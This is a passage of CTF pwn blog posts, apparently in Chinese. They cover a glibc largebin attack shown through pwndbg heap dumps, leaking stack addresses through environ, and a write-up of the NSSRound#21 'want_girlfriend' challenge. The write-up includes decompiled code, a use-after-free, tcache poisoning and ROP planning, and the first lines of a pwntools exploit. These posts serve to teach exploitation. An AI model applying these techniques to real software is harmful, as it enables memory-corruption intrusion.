class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line">fd: 0x7ffff7e1b0d0</span><br><span class="line">bk: 0x7ffff7e1b0d0</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x7fffffffde80</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line">fd: 0x7ffff7e1ace0</span><br><span class="line">bk: 0x7ffff7e1ace0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559f80</span><br><span class="line">Size: 0x20080 (with flag bits: 0x20081)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555555596f0 —▸ 0x7ffff7e1ace0 (main_arena+96) ◂— 0x5555555596f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x7ffff7e1b0d0 (main_arena+1104) ◂— 0x555555559290</span><br></pre></td></tr></table></figure><p>如上所示，chunk1的<code>bk_nextsize</code>的值变为了target的地址-0x20&#x3D;0x7fffffffde80<br>再次malloc一个0x438的chunk（比chunk2更大，否则会导致chunk2被分割），将chunk2放入largebin，完成攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x430 (with flag bits: 0x431)</span><br><span class="line">fd: 0x5555555596f0</span><br><span class="line">bk: 0x7ffff7e1b0d0</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x5555555596f0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555555596c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Free chunk (largebins) | PREV_INUSE</span><br><span class="line">Addr: 0x5555555596f0</span><br><span class="line">Size: 0x420 (with flag bits: 0x421)</span><br><span class="line">fd: 0x7ffff7e1b0d0</span><br><span class="line">bk: 0x555555559290</span><br><span class="line">fd_nextsize: 0x555555559290</span><br><span class="line">bk_nextsize: 0x7fffffffde80</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555559b10</span><br><span class="line">Size: 0x30 (with flag bits: 0x30)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559b40</span><br><span class="line">Size: 0x440 (with flag bits: 0x441)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559f80</span><br><span class="line">Size: 0x20080 (with flag bits: 0x20081)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x555555559290 —▸ 0x5555555596f0 —▸ 0x7ffff7e1b0d0 (main_arena+1104) ◂— 0x555555559290</span><br></pre></td></tr></table></figure><p>我们查看攻击效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx  0x7fffffffde80</span><br><span class="line">0x7fffffffde80: 0x0000000000000000      0x00007fffffffdec0</span><br><span class="line">0x7fffffffde90: 0x00007fffffffdfd8      0x0000555555555261</span><br><span class="line">0x7fffffffdea0: 0x00005555555596f0      0x00005555555592a0</span><br><span class="line">0x7fffffffdeb0: 0x0000555555559700      0xea19bde1a8c35100</span><br><span class="line">0x7fffffffdec0: 0x0000000000000001      0x00007ffff7c29d90</span><br><span class="line">0x7fffffffded0: 0x0000000000000000      0x00005555555551a9</span><br><span class="line">0x7fffffffdee0: 0x00000001ffffdfc0      0x00007fffffffdfd8</span><br><span class="line">0x7fffffffdef0: 0x0000000000000000      0x69534c199618d9ea</span><br><span class="line">0x7fffffffdf00: 0x00007fffffffdfd8      0x00005555555551a9</span><br><span class="line">0x7fffffffdf10: 0x0000555555557da8      0x00007ffff7ffd040</span><br></pre></td></tr></table></figure><p>可以看到target（0x7fffffffdea0）已经指向了0x00005555555596f0，也就是我们的chunk2。后续便可以控制chunk2，来达成修改target指针的指向内容</p><h2 id="0x04-largebin-attack与其他攻击的结合应用"><a href="#0x04-largebin-attack与其他攻击的结合应用" class="headerlink" title="0x04 largebin attack与其他攻击的结合应用"></a>0x04 largebin attack与其他攻击的结合应用</h2><p>由于largebin attack可以修改指针指向，能够实现任意地址写入堆地址的特性，常作为堆攻击的跳板，以下仅仅举几个例子<br>一是与<code>tcache poisoning</code>结合，或者辅助劫持<code>tcache_perthread_struct</code>；二是与<code>fastbin attack</code>结合，修改<code>global_max_fast</code>的值，来实现更大<code>size</code>范围的<code>fastbin attack</code>或者是<code>house of corrosion</code>；三是与FSOP结合，打<code>_IO_FILE</code><br>以后可能会开几篇博客记录一下（<del>咕咕？</del>）<br><del>再挖个坑，准备入坑学习<code>_IO_FILE</code></del>，已填(<a href="https://r3t2.top/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/">关于_IO_FILE | r3t2’s blog</a>)</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> largebin attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>malloc位于栈上的chunk</title>
      <link href="/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/"/>
      <url>/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-Background"><a href="#0x00-Background" class="headerlink" title="0x00 Background"></a>0x00 Background</h2><p>笔者打nssctf上的一题打了两天才通，收获颇多，记录一下。<br>pwn攻击不应该孤立的看。换句话说，要无所不用其极，哪种攻击好使就用哪种。现在就来浅浅分析一下在堆中对栈的攻击。（手法很多，后面慢慢学慢慢补充吧</p><h2 id="0x01-利用environ变量"><a href="#0x01-利用environ变量" class="headerlink" title="0x01 利用environ变量"></a>0x01 利用environ变量</h2><p>以下调试以[NSSRound#21Basic]want_girlfriend（glibc2.35）的程序来演示。<br>在linux环境下，程序存在一个全局变量<code>(char**)environ</code>，位于libc数据段，与libcbase存在固定偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">environ_addr=libcbase+libc.sym[<span class="string">&quot;environ&quot;</span>]</span><br></pre></td></tr></table></figure><p><code>environ</code>指向一个指针数组，数组中每个指针指向一个环境变量字符串，而环境变量字符串是位于栈区的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;environ</span><br><span class="line">$1 = (&lt;data variable, no debug info&gt; *) 0x7ffff7e22200 &lt;environ&gt;</span><br><span class="line">pwndbg&gt; x/gx 0x7ffff7e22200</span><br><span class="line">0x7ffff7e22200 &lt;environ&gt;:       0x00007fffffffdfb8</span><br></pre></td></tr></table></figure><p>这样我们知道了<code>environ</code>的值，我们到栈区看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2e:0170│+148 0x7fffffffdfb8 —▸ 0x7fffffffe27b ◂— &#x27;SHELL=/bin/bash&#x27;</span><br><span class="line">2f:0178│+150 0x7fffffffdfc0 —▸ 0x7fffffffe28b ◂— &#x27;WSL2_GUI_APPS_ENABLED=1&#x27;</span><br><span class="line">30:0180│+158 0x7fffffffdfc8 —▸ 0x7fffffffe2a3 ◂— &#x27;WSL_DISTRO_NAME=Ubuntu-22.04&#x27;</span><br><span class="line">31:0188│+160 0x7fffffffdfd0 —▸ 0x7fffffffe2c0 ◂— &#x27;WT_SESSION=1c2e66a8-92b1-4c76-b525-e18b94cf4188&#x27;</span><br><span class="line">32:0190│+168 0x7fffffffdfd8 —▸ 0x7fffffffe2f0 ◂— &#x27;NAME=LAPTOP-6JKPOVPE&#x27;</span><br><span class="line">33:0198│+170 0x7fffffffdfe0 —▸ 0x7fffffffe305 ◂— &#x27;PWD=/home/turing/girlfriend&#x27;</span><br><span class="line">34:01a0│+178 0x7fffffffdfe8 —▸ 0x7fffffffe321 ◂— &#x27;LOGNAME=turing&#x27;</span><br><span class="line">35:01a8│+180 0x7fffffffdff0 —▸ 0x7fffffffe330 ◂— &#x27;_=/usr/bin/gdb&#x27;</span><br><span class="line">36:01b0│+188 0x7fffffffdff8 —▸ 0x7fffffffe33f ◂— &#x27;LINES=40&#x27;</span><br><span class="line">37:01b8│+190 0x7fffffffe000 —▸ 0x7fffffffe348 ◂— &#x27;HOME=/home/turing&#x27;</span><br><span class="line">38:01c0│+198 0x7fffffffe008 —▸ 0x7fffffffe35a ◂— &#x27;LANG=C.UTF-8&#x27;</span><br><span class="line">39:01c8│+1a0 0x7fffffffe010 —▸ 0x7fffffffe367 ◂— &#x27;WSL_INTEROP=/run/WSL/398_interop&#x27;</span><br><span class="line">3a:01d0│+1a8 0x7fffffffe018 —▸ 0x7fffffffe388 ◂— 0x524f4c4f435f534c (&#x27;LS_COLOR&#x27;)</span><br><span class="line">3b:01d8│+1b0 0x7fffffffe020 —▸ 0x7fffffffe977 ◂— &#x27;COLUMNS=144&#x27;</span><br></pre></td></tr></table></figure><p>发现0x00007fffffffdfb8正是指向栈上的环境变量的二级指针。且环境变量指针数组也是位于栈上的。那么我们便可以通过泄露<code>environ</code>的值来泄露栈地址了。<br>我们在<code>main</code>下个断点，然后查看<code>main</code>函数的返回地址处</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack</span><br><span class="line">00:0000│ rbp rsp 0x7fffffffde90 ◂— 1</span><br><span class="line">01:0008│+008     0x7fffffffde98 —▸ 0x7ffff7c29d90 ◂— mov edi, eax</span><br></pre></td></tr></table></figure><p>在<code>rbp+0x08</code>处，正是在0x7fffffffde98。显然其与<code>environ</code>的值的偏移是固定的，其他函数同样如此。这样我们便可以利用泄露的environ地址来对函数返回地址进行读写，来进行我们熟悉的ROP操作劫持程序执行流。</p><h2 id="0x02-利用残留的栈上数据"><a href="#0x02-利用残留的栈上数据" class="headerlink" title="0x02 利用残留的栈上数据"></a>0x02 利用残留的栈上数据</h2><p>当程序从栈区向堆区复制数据时候，可能会将栈上残留的栈地址带入堆区。<br>例如，<code>strcpy()</code>函数，无长度检查，遇到<code>\x00</code>停止复制，如果程序从栈上buf区向chunk复制数据，我们向buf输入非<code>\x00</code>数据，经过调试来将栈上地址copy到chunk中。<br>先鸽，咕咕</p><h2 id="0x03-利用-IO-FILE"><a href="#0x03-利用-IO-FILE" class="headerlink" title="0x03 利用_IO_FILE"></a>0x03 利用_IO_FILE</h2><p>先鸽，咕咕</p><h2 id="0x04-NSSRound-21Basic-want-girlfriend"><a href="#0x04-NSSRound-21Basic-want-girlfriend" class="headerlink" title="0x04 [NSSRound#21Basic]want_girlfriend"></a>0x04 [NSSRound#21Basic]want_girlfriend</h2><p>菜单题64位保护全开，先放题目各选项源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">creat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flag == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no,You can only have one girlfriend!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please input her height:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt; <span class="number">140</span> &amp;&amp; v1 &lt;= <span class="number">259</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Are you sure???&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    new = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( !new )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input her name&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x10u</span>LL);</span><br><span class="line">    <span class="built_in">strcpy</span>(new, buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Plese input her describe&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">    <span class="built_in">strcpy</span>(new + <span class="number">16</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)++flag;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先read到栈上再strcpy到chunk。限制size为140-259.用flag记录chunk数量，只允许flag小于1时申请chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your girlfriend is &quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, new, <span class="number">0x10u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;she is &quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, new + <span class="number">16</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  v0 = *((_QWORD *)new + <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your love: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, new + <span class="number">48</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">    LODWORD(v0) = <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用write打印堆上数据，不用担心<code>\x00</code>截断（喜），同时可以打印chunk+0x30处数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">abandon</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure you want to abandon her now???&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf[<span class="number">0</span>] == <span class="number">89</span> )</span><br><span class="line">    <span class="built_in">free</span>(new);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;If you leave, I will life and death dependency.&quot;</span>);</span><br><span class="line">  --flag;</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free没有清指针，可以uaf，且不检查double free。还可以不free任何chunk。flag自减。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">love</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !new )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( flag &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;If you abandon her, the best love is forgetting&quot;</span>);</span><br><span class="line">    *(_QWORD *)new = <span class="number">0LL</span>;</span><br><span class="line">    *((_QWORD *)new + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">    result = (_DWORD)new + <span class="number">16</span>;</span><br><span class="line">    *((_QWORD *)new + <span class="number">2</span>) = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please input your love&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, new + <span class="number">56</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>flag</code>小于等于0时可以将<code>chunk</code>内前<code>0x18</code>全部置0。<code>flag</code>&gt;0时可以向<code>chunk</code>的<code>mem+0x38</code>处写数据。<br>到这里笔者起初是想劫持<code>tcache_perthread_struct</code>，但此题是高版本<code>glibc2.35</code>，<code>counts</code>数组较长（0x80），我们的可写数据的<code>chunk</code>区域只有<code>creat</code>函数提供的的前0x30，以及<code>love</code>函数提供的<code>mem+0x38</code>到<code>mem+0x58</code>处。无法写到<code>tcache-&gt;entries</code>数组。<br>但是笔者又设想可以修改<code>counts</code>数组来方便的将<code>chunk</code>投入<code>unsorted bin</code>来泄露<code>libc</code>。但是在具体操作时总是失败。因为可写区域的限制，修改不到0x290size的<code>chunk</code>（也就是<code>tcache_perthread_struct</code>）对应的<code>counts</code>数组元素。而如果要为其他size的<code>chunk</code>改写<code>counts</code>成员，来伪装填满<code>tcachebins</code>，又需要额外申请<code>chunk</code>。还不如直接连续free七次来简单粗暴的填满<code>tcache</code>。<br>在此版本中有<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/"><code>tcache-&gt;key</code>来防御double free</a>，但是注意到love函数可以将<code>chunk</code>清零来破坏<code>key</code>字段，可行。于是就可以将<code>chunk</code>投入<code>unsorted bin</code>来泄露<code>libc</code>。这里注意，只有<code>tcache-&gt;counts</code>中的数据大于0时才能从对应<code>tcachebin</code>中申请到<code>chunk</code>，所以<code>double free</code> 的时候我们要多<code>free</code>一次。<br>然后<code>glibc2.35</code>，第一时间想到接着打<code>tcache</code>。可以进行<code>tcache poisoning</code>，存在<a href="https://fuckth3w0r1d.github.io/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/">safe-linking</a>，但也可以绕过，那么任意地址读写实现了，接着如果<code>getshell</code>呢？由于<code>hooks</code>的移除，那么攻击面进一步缩小。笔者这里自然也是想到了打<code>ROP</code>（个中艰辛不足道也）。既然要打<code>ROP</code>，栈上地址可以通过<code>environ</code>变量泄露。后来看其他师傅的wp，发现也可以利用<code>strcpy()</code>来带出栈上地址。<br>同时考虑到<code>canary</code>，再去绕过<code>canary</code>的话就太累了，我们很快发现<code>love</code>函数并没有<code>canary</code>，可以覆盖<code>love</code>函数的返回地址。然后<code>rop</code>链可以用<code>love</code>函数注入<br>ok分析完毕，直接放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28949</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./[NSSRound21Basic]want_girlfriend&#x27;)</span></span><br><span class="line"><span 